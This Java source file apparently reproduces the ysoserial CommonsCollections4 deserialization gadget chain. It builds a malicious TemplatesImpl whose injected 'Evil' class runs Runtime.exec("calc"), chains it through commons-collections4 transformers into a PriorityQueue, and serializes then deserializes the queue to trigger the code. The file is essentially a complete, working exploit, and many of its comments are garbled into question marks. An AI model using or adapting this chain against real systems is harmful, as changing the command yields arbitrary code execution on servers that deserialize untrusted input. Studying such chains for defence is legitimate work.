package com.r17a.ysoserial;

import com.r17a.annotation.Dependencies;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.supeream.serial.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/*
 * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */

@Dependencies({"org.apache.commons:commons-collections4:4.0"})
public class CommonsCollections4 {
    public static void main(final String[] args) throws Exception {
        Templates templates = getEvilTemplatesImpl();

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] { String.class };
        Object[] args1 = new Object[] { "foo" };
        InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, args1);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args1 = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

        // create queue with numbers
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
        queue.add(1);
        queue.add(1);

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args1[0] = templates;

        FileOutputStream fileOutputStream = new FileOutputStream(new File("E:\\test.ser"));
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(queue);

        FileInputStream fileInputStream = new FileInputStream(new File("E:\\test.ser"));
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }

    public static TemplatesImpl getEvilTemplatesImpl() throws Exception {
        ClassPool pool = ClassPool.getDefault();//ClassPool?????????????????????class?????????CtClass???????????????
        CtClass cc = pool.makeClass("Evil");//??????Evil???
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//??????Evil???????????????AbstractTranslet
        CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//????????????????????????
        cons.setBody("{ Runtime.getRuntime().exec(\"calc\"); }");//???????????????????????????
        cc.addConstructor(cons);
        byte[] byteCode = cc.toBytecode();//toBytecode??????Evil???????????????
        byte[][] targetByteCode = new byte[][]{byteCode};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFieldValue(templates, "_bytecodes", targetByteCode);
        setFieldValue(templates, "_class", null);
        setFieldValue(templates, "_name", "xx");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    //???????????????obj???????????????
    private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

